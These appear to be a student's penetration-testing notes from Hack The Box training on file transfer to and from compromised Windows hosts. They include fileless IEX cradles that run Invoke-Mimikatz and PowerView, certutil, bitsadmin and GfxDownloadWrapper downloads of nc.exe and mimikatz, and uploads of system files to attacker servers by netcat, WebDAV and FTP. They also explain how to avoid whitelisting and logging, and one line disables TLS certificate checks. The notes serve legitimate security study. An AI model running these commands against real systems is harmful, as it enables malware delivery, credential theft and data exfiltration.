# PowerShell Base64 Encode & Decode
1) Generate hash
```sh
aaryan11x@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

2) Encode SSH key to Base 64
```sh
aaryan11x@htb[/htb]$ cat id_rsa | base64 -w 0;echo
```

3) Copy & paste it into PowerShell
```powershell
PS C:\htb> [IO.File]::WriteAllBytes("[File_Path]", [Convert]::FromBase64String("[Encoded_String]"))
```

4) Check hash value
```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

%% Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. %%

---
# PowerShell Web Downloads
Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe).
PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP.

| Method              | Description                                                                                 |
| ------------------- | ------------------------------------------------------------------------------------------- |
| **OpenRead**            | Returns the data from a resource as a Stream                                                |
| **OpenReadAsync**       | Returns the data from a resource without blocking the calling thread                        |
| **DownloadData**        | Downloads data from a resource and returns a Byte array                                     |
| **DownloadDataAsync**   | Downloads data from a resource and returns a Byte array without blocking the calling thread |
| **DownloadFile**        | Downloads data from a resource to a local file                                              |
| **DownloadFileAsync**   | Downloads data from a resource to a local file without blocking the calling thread          |
| **DownloadString**      | Downloads a String from a resource and returns a String                                     |
| **DownloadStringAsync** | Downloads a String from a resource without blocking the calling thread                                                                                            |

## File Download
```powershell
# PS C:\htb> Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# PS C:\htb>Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')

# From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases "iwr"
PS C:\htb> iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

## DownloadString - Fileless Method
 Instead of downloading a PowerShell script to disk, we can run it directly in memory using the `Invoke-Expression` cmdlet or the alias `IEX`.
```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# IEX also accepts pipeline input
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

List of [Powershell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Common Errors with Powershell
**Error 1**
![[Pasted image 20230917153859.png]]

This can be bypassed using the parameter `-UseBasicParsing`.
```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

# Fix
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

**Error 2: Certificate Trust Error for SSL/TLS**
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

# Fix
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---
# certutil
```cmd
certutil -urlcache -split -f http://10.8.139.254/shell.exe shell.exe
```

You can also **Encode/Decode** files in Base64 with certutil:-
```cmd
certutil -encode file1 encodedfile

certutil -decode encodedfile file2
```

---
# SMB Downloads
1) Create SMB Server using *Impacket* with Username & Password
```sh
# In /opt/impacket/example
python smbserver.py share -smb2support /tmp/smbshare -user test -password test
```

2) Mount SMB Server
```powershell
C:\htb> net use n: \\192.168.1.101\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.

# Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`
```

---
# FTP Download
1) Install python ftp module
```sh
aaryan11x@htb[/htb]$ pip3 install pyftpdlib
```
Then we can specify port number 21 because, by *default*, pyftpdlib uses port `2121`.

2) Setup Python server
```sh
# The directory you run this command in this the default directory
aaryan11x@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
```

3) Transfer files
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.1.101/file.txt', 'ftp-file.txt')
```

##### Create a Command File for the FTP Client and Download the Target File
```cmd
C:\htb> echo open 192.168.1.101 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.1.101
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

---
# File Upload Methods
## Basic method
Base64 encode using PowerShell
```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

# Generate MD5 Hash
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

Then decode it in Linux & check the hash.

## PowerShell Web Uploads
1) Install Configured Web Server with Upload
```sh
aaryan11x@htb[/htb]$ pip3 install uploadserver
aaryan11x@htb[/htb]$ python3 -m uploadserver
```

2) Upload file to *Python Upload Server*
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.1.101:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

## PowerShell with Netcat
```sh
# Start Netcat on Linux
nc -lvnp 8000
```

```powershell
# On PowerShell window
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.1.101:8000/ -Method POST -Body $b64
```

Then decode the Base64 string you get on Linux.

## SMB Uploads with WebDAV
**WebDAV** is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to *behave like a fileserver*, supporting collaborative content authoring. WebDAV can also use HTTPS.
When you use SMB, it will *first* attempt to *connect using the SMB* protocol, and if there's *no SMB* share *available*, it will try to connect using *HTTP*.

```sh
# Install WebDav Python module
pip install wsgidav cheroot

# Using WebDav Python module
wsgidav --host=0.0.0.0 --port=80 --root=/root/webdav --auth=anonymous
```

Connect to **WebDav** share
```powershell
C:\htb> dir \\192.168.1.101\DavWWWRoot

 Volume in drive \\192.168.1.101\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.1.101\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

%% Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.1.101\[folder_name]
%%

```powershell
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.1.101\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.1.101\sharefolder\
```


## FTP Uploads
```sh
python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.1.101/hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

**Create a Command File for the FTP Client to Upload a File**
```sh
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

---
# Transfer Files with Code
1) **JavaScript**
```js
// Create a file called "wget.js"
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
```powershell
C:\htb> cscript.exe /nologo wget.js [URL] [Output Filename]
```


2) **VBScript**
```vbscript
Rem Create a file called wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
```powershell
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---
# Bitsadmin
```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
# OR
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

# GfxDownloadWrapper
Application whitelisting may *prevent* you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. The Intel Graphics Driver for Windows 10 (`GfxDownloadWrapper.exe`), installed on some systems and contains functionality to download configuration files periodically.
```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```